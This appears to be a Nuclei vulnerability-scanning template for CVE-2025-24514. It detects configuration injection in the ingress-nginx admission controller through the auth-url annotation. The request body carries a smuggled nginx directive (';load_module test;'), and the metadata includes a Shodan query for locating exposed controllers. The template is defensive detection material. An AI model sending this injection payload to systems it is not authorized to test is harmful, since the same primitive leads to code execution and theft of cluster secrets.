http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - AdmissionReview
    - directive is not allowed here
    - load_module
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"\
    kind\": \"AdmissionReview\",\n  \"apiVersion\": \"admission.k8s.io/v1\",\n  \"\
    request\": {\n    \"uid\": \"d48aa397-c414-4fb2-a2b0-b28187daf8a6\",\n    \"kind\"\
    : {\n      \"group\": \"networking.k8s.io\",\n      \"version\": \"v1\",\n   \
    \   \"kind\": \"Ingress\"\n    },\n    \"resource\": {\n      \"group\": \"networking.k8s.io\"\
    ,\n      \"version\": \"v1\",\n      \"resource\": \"ingresses\"\n    },\n   \
    \ \"requestKind\": {\n      \"group\": \"networking.k8s.io\",\n      \"version\"\
    : \"v1\",\n      \"kind\": \"Ingress\"\n    },\n    \"requestResource\": {\n \
    \     \"group\": \"networking.k8s.io\",\n      \"version\": \"v1\",\n      \"\
    resource\": \"ingresses\"\n    },\n    \"name\": \"test-{{randstr}}\",\n    \"\
    namespace\": \"default\",\n    \"operation\": \"CREATE\",\n    \"userInfo\": {\n\
    \n    },\n    \"object\": {\n      \"kind\": \"Ingress\",\n      \"apiVersion\"\
    : \"networking.k8s.io/v1\",\n      \"metadata\": {\n        \"name\": \"test-{{randstr}}\"\
    ,\n        \"namespace\": \"default\",\n        \"creationTimestamp\": null,\n\
    \        \"annotations\": {\n\"nginx.ingress.kubernetes.io/auth-url\": \"http://example.com#;load_module\
    \ test;\\n\"\n        }\n      },\n      \"spec\": {\n        \"ingressClassName\"\
    : \"nginx\",\n        \"rules\": [\n          {\n            \"host\": \"{{randstr}}\"\
    ,\n            \"http\": {\n              \"paths\": [\n              ]\n    \
    \        }\n          }\n        ]\n      },\n      \"status\": {\n        \"\
    loadBalancer\": {}\n      }\n    },\n    \"oldObject\": null,\n    \"dryRun\"\
    : true,\n    \"options\": {\n      \"kind\": \"CreateOptions\",\n      \"apiVersion\"\
    : \"meta.k8s.io/v1\"\n    }\n  }\n}\n"
id: CVE-2025-24514
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2025-24514
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-20
    epss-percentile: 0.97452
    epss-score: 0.44989
  description: 'A security issue was discovered in  ingress-nginx https-//github.com/kubernetes/ingress-nginx  where
    the `auth-url` Ingress annotation can be used to inject configuration into nginx.
    This can lead to arbitrary code execution in the context of the ingress-nginx
    controller, and disclosure of Secrets accessible to the controller. (Note that
    in the default installation, the controller can access all Secrets cluster-wide.)

    '
  impact: 'Authenticated users with Ingress creation permissions can inject nginx
    configuration through the auth-url annotation, leading to arbitrary code execution
    in the ingress-nginx controller context and disclosure of all Kubernetes Secrets
    cluster-wide.

    '
  metadata:
    max-request: 1
    shodan-query: ssl:"ingress-nginx" port:8443
    verified: true
  name: Ingress-Nginx Controller - Configuration Injection via Unsanitized `auth-url`
    Annotation
  reference:
  - https://github.com/kubernetes/kubernetes/issues/131006
  - https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
  - https://nvd.nist.gov/vuln/detail/CVE-2025-24514
  remediation: 'Upgrade to the patched version of ingress-nginx that properly sanitizes
    the auth-url annotation.

    '
  severity: high
  tags: cve,cve2025,cloud,devops,kubernetes,ingress,nginx,k8s,vuln
